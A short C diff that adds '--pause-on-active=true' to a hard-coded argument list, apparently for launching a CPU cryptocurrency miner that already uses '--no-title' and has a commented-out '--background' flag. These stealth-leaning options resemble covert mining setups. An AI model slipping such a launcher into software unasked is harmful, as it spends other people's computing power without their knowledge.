@@ -37,10 +37,11 @@ int main(int argc, char **argv) {
     //char  arg3[] = "--background";
     char  arg4[] = "--no-title";
     char  arg5[] = "--nicehash";
+    char arg6[] = "--pause-on-active=true";
     // char arg6[] = "--cpu-max-threads-hint";
     // char arg7[] = "50";
 
-    char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg4[0], &arg5[0], NULL };
+    char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg4[0], &arg5[0], &arg6[0], NULL };
     //char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg3[0], &arg4[0], &arg5[0], &arg6[0], &arg7[0], NULL };
     int   argcc   = (int)(sizeof(argvv) / sizeof(argvv[0])) - 1;
     // for(int i = 0; i < argcc; i++)
